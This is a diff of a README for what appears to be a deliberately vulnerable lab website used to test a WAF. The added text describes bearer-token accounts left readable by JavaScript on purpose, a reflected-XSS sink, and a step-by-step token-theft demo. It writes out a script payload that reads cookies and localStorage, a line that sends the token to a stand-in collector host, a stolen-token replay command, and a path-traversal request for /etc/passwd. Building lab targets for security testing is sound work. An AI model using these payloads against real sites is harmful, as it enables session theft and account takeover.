@@ -4,15 +4,16 @@ A small React site + Flask API, packaged with nginx and Docker Compose. It is th
 **origin website** that sits behind your WAF so you can scan the WAF with
 [`../script/run_gotestwaf.sh`](../script/run_gotestwaf.sh).
 
-Two pages:
+Three pages:
 
 | Page | What it does |
 | --- | --- |
 | `/` | Landing page. Content only — **no API calls at all**. |
-| `/rules` | House rules. Carries all the request traffic: a search that sends the payload in the **URL query** (`GET /api/rules?q=…`) and a note box that sends it in the **request body** (`POST /api/notes`). Each shows the status code and the raw origin response, so you can see whether the WAF blocked a payload or the origin echoed it back. |
+| `/rules` | House rules. Carries request traffic: a search that sends the payload in the **URL query** (`GET /api/rules?q=…`) and a note box that sends it in the **request body** (`POST /api/notes`). Each shows the status code and the raw origin response, so you can see whether the WAF blocked a payload or the origin echoed it back. |
+| `/account` | Real **register / login** with a hashed password and a **bearer-token session** (see [Accounts](#accounts-and-the-token-theft-demo)). Logged in, it shows the token and where it lives — the thing the reflected-XSS demo actually steals. |
 | anything else | Handed to the Flask app, which answers **`200`** with a JSON echo. |
 
-The two real routes are listed twice — as `ROUTES` in `web/src/App.jsx` and as exact-match
+The real routes are listed twice — as `ROUTES` in `web/src/App.jsx` and as exact-match
 `location` blocks in `nginx/default.conf`. **Add a new page to both**, or nginx will hand
 a route the app knows about to the API instead of serving the app shell.
 
@@ -69,7 +70,7 @@ curl -s http://localhost/       | grep -o '<div id="root">'   # app shell
 curl -so /dev/null -w '%{http_code}\n' http://localhost/rules # 200 — a real route
 curl -so /dev/null -w '%{http_code}\n' http://localhost/nope  # 200 — handed to the API
 curl -so /dev/null -w '%{http_code}\n' -X POST -d a=1 http://localhost/  # 200 — body read
-curl -s http://localhost/api/health                           # {"status":"ok","build":"real-2"}
+curl -s http://localhost/api/health                           # {"status":"ok","build":"real-5"}
 curl -s 'http://localhost/api/reports/download?file=../../../../etc/passwd'  # REAL file read (sink container)
 ```
 
@@ -85,13 +86,23 @@ return `200` with a JSON echo of the request:
 | `/api/players` | Poker players resource |
 | `/api/tables` | Live tables resource |
 | `/api/games` | Games resource |
-| `/api/login` | Login resource |
 | `/api/health` | `{"status":"ok","build":"…"}` — the `build` is the deployed-version check |
 | `/api/<anything>` | Catch-all → `200` echo, so any path/method the WAF test throws lands on the origin |
 
 `/api/rules` and `/api/notes` need no code in `api/app.py` — the catch-all route already
-returns a `200` echo for any `/api/*` path. There is no datastore: posting a note echoes
-it back, and the site appends it client-side only.
+returns a `200` echo for any `/api/*` path. There is no datastore for notes: posting one
+echoes it back, and the site appends it client-side only.
+
+These four are **real** and not echoes — they back the `/account` page (see
+[Accounts](#accounts-and-the-token-theft-demo)). They answer `200` with an `{"ok": bool}`
+body (not `401`/`409`) so the origin's "every response is a scoreable `200`" rule holds:
+
+| Endpoint | Method | Notes |
+| --- | --- | --- |
+| `/api/register` | POST | `{username, password}` → creates a user in the lab Mongo (hashed password) |
+| `/api/login` | POST | `{username, password}` → `{ok, token, user}`; also sets the `token` cookie |
+| `/api/me` | any | `Authorization: Bearer <token>` (or the cookie) → the account the token owns |
+| `/api/logout` | POST | clears the `token` cookies |
 
 ### Real attack surface (detonation chamber)
 
@@ -161,6 +172,62 @@ That tag is the join key from a line here to a per-test row of the scan's report
 `.json` artifact, and the `.csv` too if the gotestwaf image still emits one), so a
 "bypassed" row can be tied to the payload that arrived and what it did on the origin.
 
+### Accounts and the token-theft demo
+
+The `/account` page is a genuine little auth system so the reflected-XSS test has a real
+prize. `api/auth.py` stores users in the lab Mongo (PBKDF2-hashed passwords) and, on login,
+mints a signed **HS256 bearer token** (stdlib — no JWT library). The token is handed to the
+browser two ways on purpose, both reachable by JavaScript on this origin:
+
+- `localStorage["fnp_token"]`, sent back as `Authorization: Bearer …` — the typical SPA
+  pattern, and stealable via `localStorage`;
+- a JS-readable `token` cookie — stealable via `document.cookie` (the report's
+  `document["cookie"]` payload). A parallel `token_httponly` cookie holds the same value
+  but is hidden from JavaScript: that is the real-world fix, shown as a contrast.
+
+Whoever holds the token **is** the account: replay it against `GET /api/me` and the origin
+answers with the victim's profile. That turns an XSS bypass from "the WAF returned 200" into
+account takeover.
+
+**Pre-seeded demo accounts.** `setup.sh up` creates these at startup (the api waits on a
+Mongo healthcheck, so the seed is reliable, not a race), so you can log in immediately
+without registering. Fake credentials over fake data:
+
+| Username | Password | Role |
+| --- | --- | --- |
+| `linh` | `poker123` | admin |
+| `tuan` | `allin2026` | player |
+| `mai` | `riverqueen` | player |
+
+Log in as `linh` for the takeover demo — a token stolen from that session owns an admin
+account.
+
+#### The reflected-XSS sink
+
+Most sinks answer JSON, so a reflected payload is inert. The exception is
+`GET /api/sink/xss?q=<payload>`, which echoes `q` into an HTML page **unescaped** — a genuine
+reflected XSS you trigger in a browser. The end-to-end demo:
+
+1. On `/account`, register and log in (in a browser). The token now lives in this origin's
+   `localStorage` and `token` cookie.
+2. Open the reflected sink with a payload that reads them:
+
+   ```
+   https://your-domain/api/sink/xss?q=<script>alert(document.cookie+'\n'+localStorage.fnp_token)</script>
+   ```
+
+   The alert shows the `token` cookie and the localStorage token — **but not**
+   `token_httponly`. Real exfiltration swaps the `alert(...)` for
+   `new Image().src="//your-collaborator/?t="+localStorage.fnp_token`.
+3. Replay the stolen token to prove takeover:
+
+   ```bash
+   curl -sk https://your-domain/api/me -H "Authorization: Bearer <stolen-token>" | jq
+   ```
+
+Because the WAF blocks most `<script>` payloads, confirm the mechanism against the origin
+directly first, then through the WAF to see which weaponised forms it stops.
+
 One behavioural note: the app reads the raw request body before Flask parses it, so a
 form-encoded body appears in the echo as the raw string rather than a parsed dict.
 
@@ -179,12 +246,15 @@ curl -s -X DELETE http://localhost/api/tables/42
 web/     React app (Vite) + Dockerfile — compiled into the `site` volume for nginx
   index.html            Vite entry
   src/App.jsx           shell + route switch
-  src/router.jsx         ~30-line router (no routing library for two pages)
+  src/router.jsx        ~30-line router (no routing library)
   src/styles.css        design tokens + all styles
+  src/lib/auth.js       client auth helpers (token storage, fetch wrappers)
   src/pages/Home.jsx    landing page (no API calls)
   src/pages/Rules.jsx   house rules + the two API targets
+  src/pages/Account.jsx register / login / session token (the XSS-theft target)
 api/     Flask app + Dockerfile (the API backend / orchestrator)
   app.py                routes, request classification, evidence log
+  auth.py               real accounts + bearer-token sessions (Mongo, PBKDF2, HS256 JWT)
   sinks.py              payload classifier + dispatch to the sink; scoped JNDI callback
 sink/    Detonation chamber + Dockerfile — the real, contained vulnerable backends
   sink_app.py           per-category handlers that actually execute the payload
